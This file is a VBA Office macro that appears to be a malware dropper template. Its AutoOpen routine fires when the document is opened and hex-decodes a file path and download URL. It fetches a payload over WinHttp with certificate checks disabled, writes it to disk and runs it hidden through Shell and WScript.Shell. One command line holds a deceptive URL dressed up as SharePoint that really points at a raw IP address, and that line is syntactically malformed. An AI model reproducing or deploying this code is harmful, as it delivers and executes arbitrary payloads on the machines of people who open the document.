Sub love_me_____()
    Dim filePath As String
    Dim encodedPath As String  
    
    encodedPath = "Put the HEX code for the actual path here"
    filePath = DecodeHex(encodedPath)

    If Len(Dir(filePath)) > 0 Then
        ExecuteFile filePath
    Else
        DownloadAndRun filePath
    End If
End Sub

Sub DownloadAndRun(filePath As String)
    On Error Resume Next
    Dim objHTTP As Object
    Dim fileNum As Integer
    Dim byteData() As Byte
    Dim fileURL As String
    Dim encodedURL As String  
    
    encodedURL = "Put the HEX code for the download URL here"
    fileURL = DecodeHex(encodedURL)
   
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Option(4) = 13056
    objHTTP.Open "GET", fileURL, False
    objHTTP.send
   
    If objHTTP.Status = 200 Then
        byteData = objHTTP.responseBody
       
        If UBound(byteData) > 0 Then
            fileNum = FreeFile
            Open filePath For Binary Access Write As #fileNum
            Put #fileNum, , byteData
            Close #fileNum
           
            ExecuteFile filePath
        End If
    End If
End Sub

Function DecodeHex(hexString As String) As String
    Dim i As Long
    Dim result As String
    
    For i = 1 To Len(hexString) Step 2
        result = result & Chr$(Val("&H" & Mid$(hexString, i, 2)))
    Next i
    
    DecodeHex = result
End Function

Sub ExecuteFile(filePath As String)
    On Error Resume Next
   
    Shell filePath, vbHide
    CreateObject("WScript.Shell").Run "cmd /c start /b """ & filePath & https://my.sharepoint.com:@192.168.82.231:8080 """", 0, False
   
End Sub

Sub AutoOpen()
    love_me_____	
End Sub
